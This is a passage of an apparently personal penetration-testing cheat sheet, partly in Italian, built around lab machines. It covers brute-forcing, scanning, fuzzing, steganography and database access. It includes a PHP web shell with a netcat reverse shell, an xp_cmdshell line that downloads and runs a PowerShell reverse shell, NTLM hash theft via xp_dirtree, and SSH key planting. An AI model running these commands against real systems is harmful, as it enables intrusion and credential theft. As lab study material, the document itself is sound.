rockyou.txt<strong> ftp://10.10.66.224</strong>  								#<strong>-l </strong>= <strong>login</strong> username, <strong>-P </strong>= <strong>password file </strong><br /><strong>hydra -t 4 -l </strong>dale<strong> -P </strong>rockyou.txt <strong>-vV</strong> 10.10.10.6<strong> ftp  							# -t= </strong>parallel connections x target<br /> </div><div class='page'><h1 class='title level-3'>ssh</h1><br/><strong><span style="color:#0000ff;">ssh</span></strong><br /><strong>hydra</strong> <strong>-l</strong> user<strong> -p </strong>m19RoAU0hP41A1sTsq6K 10.10.11.100 <strong>ssh 								#-p=single password</strong><br /><strong>hydra -t 16 -l</strong> administrator<strong> -P</strong> rockyou.txt <strong>-vV</strong> 10.10.13.179 <strong>ssh</strong>							<strong>#-P=password list</strong><br /><strong>hydra -l</strong> sam <strong>-P </strong>rockyou.txt <strong>ssh://</strong>10.10.86.111:<strong>4567 -t 4 -V</strong><br />hydra -l lin -P rockyou.txt ssh://10.10.84.123 -t 4<strong> -e nsr</strong><br /></div><div class='page'><h1 class='title level-3'>forms</h1><br/><strong><span style="color:#0000ff;">Form</span></strong> (Burpsuite)</div><div class='page'><h1 class='title level-4'>GET</h1><br/><strong><span style="color:#0000ff;">#get</span></strong>																							<br /><strong>hydra -l </strong>bob<strong> -P </strong>rockyou.txt<strong> -f </strong>10.10.162.27<strong> http-get /protected/</strong>											#f=stops when found<br /><strong>hydra -l </strong>admin<strong>-P </strong>rockyou.txt<strong> -f </strong>10.10.10.157<strong> http-get /monitoring</strong><br /><br /><strong>hydra</strong> -<strong>C</strong> tomcat-betterdefaultpasslist.txt <strong>http-get:</strong>//10.10.10.95:8080/manager/html<br /><strong><span style="color:#0000ff;">#Proxy (Burpsuite)</span></strong><br /><strong>HYDRA_PROXY_HTTP</strong>=<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a> <strong>hydra</strong> -<strong>C</strong> tomcat-betterdefaultpasslist.txt <strong>http-get:</strong>//10.10.10.95:8080/manager/html</div><div class='page'><h1 class='title level-4'>POST</h1><br/><strong><span style="color:#0000ff;">#post</span></strong><br /><strong>hydra</strong> <strong>-l </strong>admin <strong>-P </strong>rockyou.txt 10.10.10.75 <strong>http-post-form </strong>&quot;<strong>/nibbleblog/admin.php</strong>:username=^<strong>USER</strong>^&amp;password=^<strong>PASS</strong>^:Incorrect username or password&quot;<br /><strong>hydra</strong> <strong>-l </strong>milesdyson<strong> -P</strong> log1.txt 10.10.10.235 <strong>http-post-form </strong>&quot;<strong>/squirrelmail/src/redirect.php:</strong>login_username=^<strong>USER</strong>^&amp;secretkey=^<strong>PASS</strong>^&amp;js_autodetect_results=1&amp;just_logged_in=1<strong>:Unknown user or password incorrect.</strong>&quot; <strong>-V</strong><br /><strong>hydra -l</strong> rockyou.txt <strong>-P</strong> rockyou.txt <strong>-s</strong> 8080 10.10.212.60 <strong>http-post-form </strong>&quot;/j_acegi_security_check<strong>:</strong>j_username=^<strong>USER</strong>^&amp;j_password=^<strong>PASS</strong>^:Invalid username or password&quot; -V<br /><strong>hydra -l</strong> molly <strong>-P</strong> rockyou.txt 10.10.229.203 <strong>http-post-form </strong>&quot;/<strong>login</strong>:username=^<strong>USER</strong>^&amp;password=^<strong>PASS</strong>^:incorrect&quot; -V 																									#<strong>oppure</strong> &quot;<strong>/:username…</strong><br /><strong>hydra</strong> <strong>-l </strong>molly <strong>-P</strong> rockyou.txt 10.10.229.203 <strong>http-form-post </strong>&quot;<strong>/wp-login.php:</strong>log=^<strong>USER</strong>^&amp;pwd=^<strong>PASS</strong>^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&quot; -V<br /></div><div class='page'><h1 class='title level-1'>steganography</h1><br/> / encoded: %2F<br /></div><div class='page'><h1 class='title level-2'>exiftool</h1><br/><strong><span style="color:#0000ff;">EXIFTOOL  </span></strong>																							#<strong>metadata</strong><br /><strong>wget </strong><a href="http://10.10.10.98/image.jpg">http://10.10.10.98/image.jpg</a>  													#download with wget to <strong>maintain metadata</strong><br /><strong>exiftool</strong> image.jpg<br /></div><div class='page'><h1 class='title level-2'>strings</h1><br/><strong><span style="color:#0000ff;">STRINGS  </span></strong><strong>											#strings in a file</strong><br /><strong>strings</strong><strong><span style="color:#ff0000;"> </span></strong>image.jpg<br /><strong>strings</strong><strong><span style="color:#ff0000;"> </span></strong>script.sh<br /><strong>strings</strong> backup.<strong>mdb</strong> 							#see if encrypted<br /></div><div class='page'><h1 class='title level-2'>steghide</h1><br/><strong><span style="color:#0000ff;">STEGHIDE  </span></strong>													<strong>#extract data from image/audio</strong><br /><strong>steghide</strong> <strong>info</strong> image.jpg<br /><strong><span style="color:#0000ff;">#extract</span></strong><br /><strong>steghide extract -sf</strong> image.jpg   							<strong>#steg file</strong><br /></div><div class='page'><h1 class='title level-2'>binwalk</h1><br/><strong><span style="color:#0000ff;">BINWALK  </span></strong><strong>													#search binary files (images audio) from files</strong><br /><strong>binwalk </strong>image.png<br /><strong>binwalk</strong> cutie.png<strong> -e </strong> 							#<strong>extract</strong><br /><strong>binwalk -Me </strong>nineveh.png  <br /></div><div class='page'><h1 class='title level-2'>strace / ltrace</h1><br/><strong><span style="color:#0000ff;">STRACE  (sys call trace)</span></strong><br /><strong>strace</strong> /bin/<strong>sysinfo</strong><br /><strong>strace -v -f -e execve</strong> /home/rabbit/teaParty 2&gt;&amp;1 | grep exec<br />  <br /><strong><span style="color:#0000ff;">L</span></strong><strong><span style="color:#0000ff;">TRACE  </span></strong>				<strong>	#list all sys calls from binary</strong><br /><strong>ltrace</strong> ./viewuser<br /></div><div class='page'><h1 class='title level-1'>OSINT</h1><br/></div><div class='page'><h1 class='title level-2'>theharvester</h1><br/><strong><span style="color:#0000ff;">THEHARVESTER  </span></strong>														<br /><strong>theharvester -d </strong>tesla.com<strong> -l </strong>500<strong> -b</strong> google				#-l = # of searches<br /></div><div class='page'><h1 class='title level-1'>connection</h1><br/></div><div class='page'><h1 class='title level-2'>ports</h1><br/><strong><span style="color:#0000ff;">PORTS</span></strong><br /> <strong><span style="color:#4d4d4d;">20/</span></strong><span style="color:#4d4d4d;">tcp			</span><strong><span style="color:#4d4d4d;">FTP</span></strong><span style="color:#4d4d4d;"> - Fil</span>e transfer protocol - data<br /> <strong><span style="color:#ff0000;">21</span></strong><strong>/</strong>tcp			<strong><span style="color:#ff0000;">FTP</span></strong> - File transfer protocol - <strong>control</strong><br /> <strong><span style="color:#ff0000;">22</span></strong><strong>/</strong>tcp			<strong><span style="color:#ff0000;">SSH</span></strong> -<strong> Secure login</strong>, file transfer (<strong><span style="color:#ff0000;">scp, sftp</span></strong>) e <strong>port forwarding</strong><br /> <strong><span style="color:#ff0000;">23</span></strong><strong>/</strong>tcp			<strong><span style="color:#ff0000;">Telnet</span></strong> insecure text communications<br /> <strong>25/</strong>tcp			<strong>SMTP</strong> - Simple Mail Transfer Protocol (E-mail)<br /> <strong><span style="color:#ff0000;">53</span></strong><strong>/udp			</strong><strong><span style="color:#ff0000;">DNS</span></strong> - <strong><span style="color:#0000ff;">Domain Name System</span></strong><br /> 67/udp			BOOTP Bootstrap Protocol e DHCP Dynamic Host Configuration Protocol (Server)<br /> 68/udp			BOOTP Bootstrap Protocol e DHCP Dynamic Host Configuration Protocol (Client)<br /> <strong><span style="color:#ff0000;">80</span></strong><strong>/tcp			</strong><strong><span style="color:#ff0000;">HTTP</span></strong><strong> HyperText Transfer Protocol </strong>(WWW)<br /> 104/tcp			DICOM - Digital Imaging and Communications in Medicine<br /> <strong>110/tcp</strong>			POP Post Office Protocol (E-mail)<br /> 113/tcp			ident vecchio sistema di identificazione dei server<br /> 119/tcp			NNTP usato dai newsgroups usenet<br /> 123/udp			NTP usato per la sincronizzazione degli orologi client-server<br /> <strong>137/udp</strong>		NetBIOS Name Service<br /> 138/udp			NetBIOS Datagram Service<br /> <strong><span style="color:#ff0000;">139</span></strong>/tcp			NetBIOS Session Service  <strong><span style="color:#ff0000;">SMB</span></strong><br /> 143/tcp			IMAP4 Internet Message Access Protocol (E-mail)<br /> 161/udp			SNMP Simple Network Management Protocol (Agent)<br /> 162/udp			SNMP Simple Network Management Protocol (Manager)<br /> <strong>389/tcp</strong>			LDAP<br /> 411/tcp			Direct Connect Usato per gli hub della suddetta rete<br /> <strong><span style="color:#ff0000;">443</span></strong><strong>/tcp			</strong><strong><span style="color:#ff0000;">HTTPS</span></strong> usato per il trasferimento sicuro di pagine web<br /> <strong>445/tcp			Microsoft-DS</strong> (Active Directory, share di Windows, Sasser-worm)<br /> <strong><span style="color:#ff0000;">445</span></strong>/udp			<strong>Microsoft-DS </strong><strong><span style="color:#ff0000;">SMB</span></strong><strong> file sharing</strong><br /> <strong>465/tcp			SMTP</strong> - Simple Mail Transfer Protocol (E-mail) su SSL<br /> 502/tcp			Modbus<br /> 514/udp			SysLog usato per il system logging<br /> 554/udp			RTSP per lo streaming live<br /> 563/tcp			NNTP Network News Transfer Protocol (newsgroup Usenet) su SSL<br /> <strong>587/tcp</strong>			e-mail message submission (SMTP)<br /> 591/tcp			FileMaker 6.0 Web Sharing (HTTP Alternate, si veda la porta 80)<br /> 631/udp			IPP / CUPS Common Unix printing system<br /> 636/tcp			<strong>LDAP</strong> su SSL<br /> 666/tcp			Doom giocato in rete via TCP<br /> <strong>993/tcp</strong>			IMAP4 Internet Message Access Protocol (E-mail) su SSL<br /> <strong>995/tcp</strong>			POP3 Post Office Protocol (E-mail) su SSL<br /> <br /> 3389  windows remote desktop<br /></div><div class='page'><h1 class='title level-2'>FTP</h1><br/><strong><span style="color:#0000ff;">FTP</span></strong>						<strong><span style="color:#0000ff;">(port 21)</span></strong><br /><strong>ftp</strong> 10.10.8.234   													#<strong>usn</strong>:anonymous, <strong>psw</strong>:anonymous<br /><strong>ftp</strong> root@10.10.228.220<br /><br /><strong><span style="color:#0000ff;">#get/put/del</span></strong><br /><strong>get </strong>Windows\ Event\ Forwarding.docx  <br /><strong>put</strong> file.txt<br /><strong>del</strong> file.txt<br /><br /><br /><strong><span style="color:#0000ff;">#copy RSA KEY for ssh login</span></strong><br /><strong>cp /root/.ssh/id_rsa.pub .</strong>									#personal key<br /><br /> &gt; <strong>put</strong> <strong>id_rsa.pub</strong><br /> &gt; <strong>rename</strong> <strong>id_rsa.pub authorized_keys</strong><br /></div><div class='page'><h1 class='title level-2'>ssh</h1><br/><strong><span style="color:#0000ff;">SSH    </span></strong><span style="color:#0000ff;"> 										</span><strong><span style="color:#0000ff;">(port 22)</span></strong><br /><strong>ssh</strong> nyan@10.10.16.214 <br /><strong>ssh</strong> nyan@10.10.16.214 <strong>-p 65534</strong><br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>ssh-keygen</h1><br/><strong><span style="color:#0000ff;">SSH KEYGEN</span></strong><br /><strong>ssh-keygen</strong> <strong>-f</strong> theseus  					#<strong>public</strong> key (<strong>theseus.pub</strong>) <br />														#<strong>private</strong> key (<strong>theseus</strong>)  <br />ssh-keygen <strong>-y</strong> <strong>-f</strong> id_rsa 					#<strong>-y= print public key to stddout</strong><br /><br /><br /></div><div class='page'><h1 class='title level-3'>ssh RSA key</h1><br/><strong><span style="color:#0000ff;">SSH with RSA key</span></strong><br /><strong><span style="color:#0000ff;">#public key</span></strong> (<strong>on </strong><strong><span style="color:#0000ff;">remote</span></strong>)<br /><strong>• theseus.pub</strong><br />ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8fWGA//pGx88hs....plX6mkXUcZtFBK4l9B91W4Lryb8abjvVLxFxbgr+7N6dYtNyZTzM= kali@kali<br /><br /><strong>cat </strong>theseus.<strong>pub</strong><br />nano <strong>~/.ssh/authorized_keys 						 #copy public key</strong> <strong>content</strong><br />#oppure<br /><strong>echo </strong>&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8fWGA//pGx88hs….dYtNyZTzM=&quot;<strong> &gt;&gt;</strong> /home/sysadmin/<strong>.ssh/authorized_keys</strong><br />chmod 600 authorized_keys<br /><br /><strong><span style="color:#0000ff;">#</span></strong><strong><span style="color:#0000ff;">private</span></strong> <strong><span style="color:#0000ff;">key</span></strong> (<strong>on </strong><strong><span style="color:#0000ff;">local</span></strong>)<br /><strong>• theseus</strong><br /><strong>-----BEGIN OPENSSH PRIVATE KEY-----</strong><br />b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn....<br /><strong>-----END OPENSSH PRIVATE KEY-----</strong><br /><br /><strong>chmod 600 theseus      </strong>									#private,<strong> only readable by me</strong><br /><strong>ssh</strong> <strong>-i theseus </strong>theseus@10.10.10.185<br /><strong>ssh -i</strong> sysadmin sysadmin@10.10.10.181</div><div class='page'><h1 class='title level-2'>medusa</h1><br/><strong><span style="color:#0000ff;">MEDUSA   </span></strong>																		#<strong>login bruteforcing</strong>			<br /><strong>medusa -h</strong> 10.10.10.171 <strong>-U </strong>users.txt <strong>-P</strong> passwords.txt <strong>-M ssh</strong> 10.10.10.171						<strong>#user list and password list</strong><br /></div><div class='page'><h1 class='title level-2'>ssh tunneling</h1><br/><strong><span style="color:#0000ff;">SSH TUNNELING</span></strong><br /><strong>ssh -L 10000:localhost:10000</strong> agent47@10.10.187.195  									<strong>#SSH tunnel on port 10000</strong><br /><strong>ssh -L 6767:</strong>172.17.0.1<strong>:8080 </strong><a href="http://mailto:aubreanna@internal.thm">aubreanna@internal.thm</a></div><div class='page'><h1 class='title level-2'>telnet</h1><br/><strong><span style="color:#0000ff;">TELNET  									  (port 2</span></strong><strong><span style="color:#0000ff;">3)</span></strong><br /><strong>telnet</strong> 10.10.122.168 <strong>23</strong><br /><strong>HELO</strong> gmail.com<br />  <br /><strong>MAIL FROM</strong>: &lt;<a href="http://mailto:BruceWayne@WayneCorp.com">BruceWayne@WayneCorp.com</a>&gt;<br /><strong>RCPT TO: </strong>&lt;nico@megabank.com&gt;<br /></div><div class='page'><h1 class='title level-2'>nfs</h1><br/><strong><span style="color:#0000ff;">NFS </span></strong>								<strong><span style="color:#0000ff;">	(port 111/2049)</span></strong><br /><strong><span style="color:#0000ff;">#list NFS shares</span></strong><br /><strong>showmount</strong> -e 10.10.100.198<br />      <br /><strong><span style="color:#0000ff;">#connect to share                      </span></strong>share<br /><strong>sudo mount -t nfs </strong>10.10.125.220<strong>:/home /tmp/mount/</strong><br /></div><div class='page'><h1 class='title level-1'>database</h1><br/></div><div class='page'><h1 class='title level-2'>database commands</h1><br/><strong><span style="color:#0000ff;">DATABASE COMMANDS</span></strong><br /><strong><span style="color:#0000ff;">#database</span></strong><br /><strong>show databases;</strong><br /><strong>use</strong> test;										<strong>								#select db</strong><br /><br /><strong><span style="color:#0000ff;">#tables</span></strong><br /><strong>show tables;</strong><br /><strong>describe </strong>users<strong>;  											 			#search columns to query</strong><br /><br /><strong><span style="color:#0000ff;">#queries</span></strong><br /><strong>select username, password </strong>from<strong> users;</strong><br /><br /><br /></div><div class='page'><h1 class='title level-2'>mysql</h1><br/><strong><span style="color:#0000ff;">MYSQL														 (port  3306)</span></strong><br /><strong>mysql -h</strong> 10.10.114.37 <strong>-u</strong> root <strong>-p</strong><br /><strong>mysql -h</strong> 10.10.10.229 <strong>-u</strong> devteam <strong>-p -D </strong>dev   									<strong>#-D=database</strong><br /><strong>mysql -u</strong> root -p<strong> -h 127.0.0.1 </strong>																<strong>#tunneling</strong><br /><strong>mysql -u</strong> root<strong> -D</strong> moodle <strong>-p</strong><br /><br /><strong><span style="color:#0000ff;">#spawn shell</span></strong><br /><strong>\! /bin/sh  </strong><br /><br /><br /><strong>#metasploit modules</strong><br />auxiliary/admin/mysql/<strong>mysql_sql</strong><br />auxiliary/scanner/mysql/<strong>mysql_schemadump </strong> <br />auxiliary/scanner/mysql/<strong>mysql_hashdump</strong></div><div class='page'><h1 class='title level-2'>sqlite3</h1><br/><strong><span style="color:#0000ff;">SQLITE3</span></strong><br /><strong>sqlite3 Audit.db .dump</strong><br />sqlite3 webapp.db <strong>.tables</strong><br /><br />PRAGMA table_info(customers);<br /></div><div class='page'><h1 class='title level-2'>microsoft SQL server</h1><br/><strong><span style="color:#0000ff;">MICROSOFT SQL SERVER</span></strong><br /><strong>mssqlclient.py </strong>reporting<strong>@10.10.10.125 -windows-auth</strong><br /><strong>mssqlclient.py </strong>ARCHETYPE/sql_svc<strong>@10.10.10.27 -windows-auth</strong><br /><br /><strong><span style="color:#0000ff;">#see if we have SA privileges</span></strong><br /><strong>select IS_SRVROLEMEMBER (&#39;sysadmin&#39;) </strong><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>xp_cmdshell</h1><br/><strong><span style="color:#0000ff;">#xp_cmdshell </span></strong><strong>					(to execute commands)</strong><br /><strong>enable_xp_cmdshell</strong><br /><strong>xp_cmdshell </strong>powershell IEX(New-Object Net.WebClient).downloadString(\&quot;http://10.10.14.18:8000/<strong>Invoke-PowerShellTcp.ps1</strong>\&quot;);<br /><br /><br /><strong><span style="color:#0000ff;">#reconfigure (automatically done by impacket)</span></strong><br />sp_configure &#39;Show Advanced Options&#39;, 1;<br />reconfigure;<br />sp_configure;<br /><strong>EXEC sp_configure &#39;xp_cmdshell&#39;, 1</strong><br />reconfigure;<br /><strong>xp_cmdshell whoami</strong></div><div class='page'><h1 class='title level-3'>xp_dirtree</h1><br/><strong><span style="color:#0000ff;">#steal hashes SQL service</span></strong><br /><strong>responder -I </strong>tun0<strong>     #locally</strong><br />exec <strong>xp_dirtree</strong> &#39;\\10.10.14.18\PleaseSub\&#39;  #in SQL</div><div class='page'><h1 class='title level-1'>CMS</h1><br/><strong><span style="color:#ff0000;">CMS (content management system)</span></strong><br /></div><div class='page'><h1 class='title level-2'>Wordpress</h1><br/><strong><span style="color:#ff0000;">WORDPRESS</span></strong><br /><strong><span style="color:#0000ff;">#login</span></strong><strong>: </strong><br /><a href="http://10.10.108.79/wp-login">http://10.10.108.79/</a><a href="http://10.10.108.79/wp-login">wp-login</a><br /><strong><span style="color:#0000ff;">#admin</span></strong><br /><a href="http://10.10.108.79/wp-admin">http://10.10.108.79</a><a href="http://10.10.108.79/wp-admin">/wp-admin</a><strong>  </strong>(after credentials)<br /> <br /><strong><span style="color:#0000ff;">#themes</span></strong><br />http://10.10.108.79/<strong>wp-content/themes</strong>/twentynineteen/404.php<br /><strong><span style="color:#0000ff;">#uploads</span></strong><br /><a href="http://10.10.108.79/wp-content/uploads/2017/07/logo.png">http://10.10.108.79/</a><a href="http://10.10.108.79/wp-content/uploads/2017/07/logo.png">wp-content/uploads/2017/07/</a><a href="http://10.10.108.79/wp-content/uploads/2017/07/logo.png">logo.png</a><br /> <br /><strong><span style="color:#0000ff;">#file.php</span></strong><br />&lt;?php system(<strong>$_REQUEST[&#39;ippsec&#39;]</strong>); ?&gt;<br />...<strong>file.php</strong>?ippsec=<strong>nc -e /bin/sh 10.10.14.11 8081</strong><br /></div><div class='page'><h1 class='title level-2'>Joomla!</h1><br/><strong><span style="color:#ff0000;">JOOMLA</span></strong>!<br /><strong><span style="color:#0000ff;">#admin login</span></strong><br /><a href="http://10.10.10.150/administrator/">http://10.10.10.150/</a><a href="http://10.10.10.150/administrator/">administrator/</a><strong>   </strong>  <br /><strong><span style="color:#0000ff;">#version</span></strong><br /><a href="http://10.10.10.150/administrator/manifests/files/joomla.xml">http://10.10.10.150/administrator/manifests/</a><a href="http://10.10.10.150/administrator/manifests/files/joomla.xml">files/joomla.xml</a><strong>  </strong><br /><strong><span style="color:#0000ff;">#templates</span></strong><br /><a href="http://10.10.10.150/templates/protostar/error.php">http://10.10.10.150/</a><a href="http://10.10.10.150/templates/protostar/error.php">templates/</a><a href="http://10.10.10.150/templates/protostar/error.php">protostar/error.php</a></div><div class='page'><h1 class='title level-2'>Others</h1><br/><strong><span style="color:#0000ff;">Other CMS</span></strong><br /><strong><span style="color:#ff0000;">Drupal</span></strong><br /><strong><span style="color:#ff0000;">Wix</span></strong><br /><strong><span style="color:#ff0000;">Blogger</span></strong><br /><strong><span style="color:#ff0000;">Shopify</span></strong><br /></div><div class='page'><h1 class='title level-1'>reconnaissance</h1><br/></div><div class='page'><h1 class='title level-2'>nmap</h1><br/><strong><span style="color:#0000ff;">NMAP               </span></strong><br /><strong>nmap </strong>-<strong>sC -sV </strong>10.10.10.42 																#<strong>-sC</strong> = <strong>script=default  					-sV= version info</strong> 			<br /><strong>nmap </strong>-<strong>sV -sC -oA </strong>nmap 10.10.10.42 											#<strong>-oA = save output</strong><br /><strong><span style="color:#0000ff;">#Port scanning</span></strong><br />nmap <strong>-Pn</strong> 10.10.223.125  																#-Pn = <strong>Port scan, (disable ping)</strong><br /><strong><span style="color:#0000ff;">#services</span></strong><br /><strong>nmap -A 10.10.210.209       </strong>														#<strong>-A</strong> = <strong>service running </strong>with<strong> OS detection</strong><br /><strong><span style="color:#0000ff;">#all/selected ports</span></strong><br />nmap -sC -sV <strong>-p-</strong> 10.10.188.177     												 	#<strong>-p-</strong>  = Scan all ports (0-65535)  <br />nmap -A <strong>-p 22,80 </strong>10.10.223.125 -oA allports.nmap<br /></div><div class='page'><h1 class='title level-3'>scripts</h1><br/><strong><span style="color:#0000ff;">#script</span></strong>						<br />nmap<strong> --script vuln</strong> -p 22,80 10.10.223.125<strong> -vv 														#vuln scriptse </strong>		-vv=verbose mode<br />nmap <strong>-p 445</strong> <strong>--script=safe</strong> -Pn 10.10.10.40      														#<strong>safe</strong><br />nmap <strong>-p 445</strong> <strong>--script=smb-enum-shares,smb-enum-users</strong> 10.10.130.183 		#SMB scripts<br />nmap <strong>-p 443 --script ssl-enum-ciphers</strong> 10.10.10.6     												#TLS <strong>version</strong><br /><br />(scripts = <strong>safe</strong>, <strong>vuln, version</strong>)</div><div class='page'><h1 class='title level-3'>connections</h1><br/><strong><span style="color:#0000ff;">#TCP</span></strong> <strong>SYN/Connect</strong><br />nmap<strong> -sS</strong> 10.10.176.206 <strong>-Pn --top-ports</strong> 5000 -vv   						#-sS=TCP <strong>SYN</strong> Scan (sends RST after SYN/ACK)																		<br />nmap <strong>-sT</strong> 10.10.188.177 																		#<strong>Connect</strong> Scan   		<br />								<strong><br /></strong><strong><span style="color:#0000ff;">#ACK</span></strong><strong> <br />-sA<br /><br /></strong><strong><span style="color:#0000ff;">#UDP</span></strong><span style="color:#0000ff;"> </span><br />-<strong>sU</strong></div><div class='page'><h1 class='title level-3'>shellshock</h1><br/><strong><span style="color:#0000ff;">#shellshock</span></strong><br />locate <strong>nse</strong> | grep <strong>shellshock</strong><br />nmap -sV <strong>-p80 --script</strong> http-shellshock<strong> --script-args</strong> uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56<br />nmap -A <strong>-p80</strong> <strong>--open 10.11.1.0/24    </strong>																											#--open=ret. machines with open ports</div><div class='page'><h1 class='title level-3'>db_nmap</h1><br/><strong><span style="color:#0000ff;">DB_NMAP</span></strong><br /><strong>msf6 &gt; db_nmap </strong>-sV 10.10.129.121<br />			   db_nmap -sV -A 10.10.97.29<br /></div><div class='page'><h1 class='title level-2'>gobuster</h1><br/><strong><span style="color:#0000ff;">GOBUSTER</span></strong><strong>     </strong><br /><strong>gobuster</strong> <strong>dir -u</strong> http://10.10.10.192/ <strong>-w directory-list-2.3-small.txt	</strong>										#anche senza http, anche ricorsivo<br /><strong>gobuster</strong> <strong>dir -u</strong> http://10.10.84.123/ -w <strong>directory-list-2.3-small.txt -t 10  								#-t= n. threads</strong><br /><strong><span style="color:#0000ff;">#https</span></strong><br />gobuster <strong>-u</strong> <strong>https</strong>://10.10.175.143<strong> -w </strong>directory-list-2.3-small.txt <strong>-k  												#skip SSL certificate</strong><br /><br /><strong><span style="color:#0000ff;">#files extensions</span></strong><br /><strong>gobuster dir -u http://10.10.46.98/ </strong>-w<strong> directory-list-2.3-small.txt -x php,txt  								</strong><br />gobuster dir -u http://10.10.92.82:<strong>3333</strong> -w directory-list-2.3-small.txt <strong>-x php,txt,html</strong>,sh,cgi<br /><br /><strong><span style="color:#0000ff;">#responses</span></strong><br /><strong>gobuster</strong> <strong>dir -u</strong> http://10.10.84.123/ -w <strong>directory-list-2.3-small.txt -s </strong>302,307,200,204,301<strong>,403</strong><br /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>dirb</h1><br/><strong><span style="color:#0000ff;">DIRB</span></strong>									(or  <strong><span style="color:#0000ff;">DIRBUSTER</span></strong> via app)<br /><strong>dirb </strong><a href="http://10.10.87.254/">http://10.10.87.254/</a><br /></div><div class='page'><h1 class='title level-2'>dirsearch</h1><br/><strong><span style="color:#0000ff;">DIRSEARCH         </span></strong><br /><strong>dirsearch -u</strong> http://10.10.74.17:3000<strong> -w</strong> directory-list-2.3-medium.txt <strong>-e php,html</strong><br /><strong>dirsearch</strong> <strong>-u</strong> http://bank.htb <strong>-w</strong> directory-list-2.3-small.txt <strong>-e php -f </strong>-t 20											#-f=force<br /></div><div class='page'><h1 class='title level-2'>wfuzz</h1><br/><strong><span style="color:#0000ff;">WFUZZ</span></strong><br /><strong><span style="color:#0000ff;">#File/directory   </span></strong><strong>               </strong><br /><strong>wfuzz -c -w</strong> common.txt <strong>--hc 404 </strong><a href="http://10.10.242.232/FUZZ.php">http://10.10.242.232/</a><a href="http://10.10.242.232/FUZZ.php">FUZZ</a><a href="http://10.10.242.232/FUZZ.php">.php</a>											#<strong>hc 404 = hides 404 not found responses</strong><br /><strong>wfuzz -c -w</strong> common.txt -<strong>-hc 404</strong> <a href="http://10.10.10.194:8080/manager/FUZZ">http://10.10.10.194:8080/manager/</a><a href="http://10.10.10.194:8080/manager/FUZZ">FUZZ</a>						#c=colors<br /><strong>wfuzz </strong>-c <strong>-z file,common.txt </strong><a href="http://10.10.242.232:80/FUZZ/note.txt">http://10.10.242.232:80</a><a href="http://10.10.242.232:80/FUZZ/note.txt">/FUZZ/</a><a href="http://10.10.242.232:80/FUZZ/note.txt">note.txt</a><strong> --hc 404</strong>    				#-z = file with words<br /><br /> <br /></div><div class='page'><h1 class='title level-3'>GET requests</h1><br/><strong><span style="color:#0000ff;">GET requests       </span></strong> <br /><strong>wfuzz</strong> <strong>-z range,0-100</strong> <strong>--hh</strong> 0 <a href="http://10.10.242.232/note.php?note=FUZZ">http://10.10.242.232/note.php?note=</a><a href="http://10.10.242.232/note.php?note=FUZZ">FUZZ</a>								 	#<strong>--hh = </strong>hides if response is of zero characters<br /><strong>wfuzz -z range,0-10</strong> <strong>--hl</strong> 97 <a href="http://testphp.vulnweb.com/listproducts.php?cat=FUZZ">http://testphp.vulnweb.com/listproducts.php?cat=</a><a href="http://testphp.vulnweb.com/listproducts.php?cat=FUZZ">FUZZ</a>				#<strong>--hl</strong> = <strong>hide lines</strong>: hides responses with # of lines (es <strong>114 L</strong>)<br />wfuzz <strong>-w</strong> burp-parameter-names.txt <strong>--hh 0</strong> <a href="http://10.10.242.232/note.php?FUZZ=1">http://10.10.242.232/note.php?</a><a href="http://10.10.242.232/note.php?FUZZ=1">FUZZ</a><a href="http://10.10.242.232/note.php?FUZZ=1">=1</a>				 <br /></div><div class='page'><h1 class='title level-3'>POST requests</h1><br/><strong><span style="color:#0000ff;">POST requests   </span></strong><br /><strong>wfuzz -z</strong> file,common.txt<strong> -u</strong> <a href="http://shibes.thm/login.php">http://shibes.thm/login.php</a><strong> -d </strong>&quot;username=<strong>FUZZ</strong>&amp;password=<strong>FUZZ</strong>&quot;																			#<strong>d= post request data</strong><br /><strong>wfuzz -u</strong> <a href="http://10.10.242.232/note.php?FUZZ=1">http://10.10.10.153/moodle/login/index.php</a> <strong>-d</strong> &#39;anchor=&amp;username=Giovanni&amp;password=thec00Lteacha<strong>FUZZ</strong>&#39; <strong>-w</strong> special-chars.txt <strong>--hh 440</strong><br /><strong>wfuzz -u</strong> http://10.10.10.157/centreon/api/index.php?action=authenticate<strong> -d </strong>‘username=admin&amp;password=<strong>FUZZ’</strong> <strong>-w</strong> special-chars.txt <strong>--hc 403</strong><br />wfuzz  <strong>-u </strong><a href="http://10.10.10.150/administrator/index.php">http://10.10.10.150/administrator/index.php</a> -<strong>d </strong>&#39;username=<strong>FUZZ</strong>&amp;passwd=Curling2018%21&amp;option=com_login&amp;task=login&amp;return=aW5kZXgucGhw&amp;06aa4ef73a6613bb4046f5d7d1b5d98f=1&#39; <strong>-w </strong>list.txt<br />wfuzz <strong>-u </strong>http://staging.love.htb/beta.php <strong>-z range,445-447</strong> <strong>-d </strong>&#39;file=http://127.0.0.1:<strong>FUZZ</strong>&amp;read=Scan+file&#39;<br /><br /><br /><strong><span style="color:#0000ff;">#Burpsuite proxy </span></strong> <br />wfuzz <strong>-w </strong>list.txt <strong>-u </strong><a href="http://10.10.10.150/administrator/index.php">http://10.10.10.150/administrator/index.php</a> -<strong>d </strong>&#39;username=<strong>FUZZ</strong>&amp;passwd=Curling2018%21&amp;option=com_login&amp;task=login&amp;return=aW5kZXgucGhw&amp;06aa4ef73a6613bb4046f5d7d1b5d98f=1&#39; <strong>-p</strong> 127.0.0.1:8080    																																							<strong>#proxy (intercept off)</strong><br /><br /><strong><span style="color:#0000ff;">#set cookie</span></strong>																								<strong>	#-b=cookie</strong><br /><strong>wfuzz</strong> <strong>-w</strong> list.txt <strong>-u</strong> http://10.10.10.150/administrator/index.php <strong>-d </strong>&#39;username=<strong>FUZZ</strong>&amp;passwd=Curling2018%21&amp;option=com_login&amp;task=login&amp;return=aW5kZXgucGhw&amp;06aa4ef73a6613bb4046f5d7d1b5d98f=1&#39; <strong>-b</strong> &#39;c0548020854924e0aecd05ed9f5b672b=a4j99ibsfmd0bfk3jr12di0cmv; 99fb082d992a92668ce87e5540bd20fa=apos7sqnne496uo13vh5peduk5&#39;   </div><div class='page'><h1 class='title 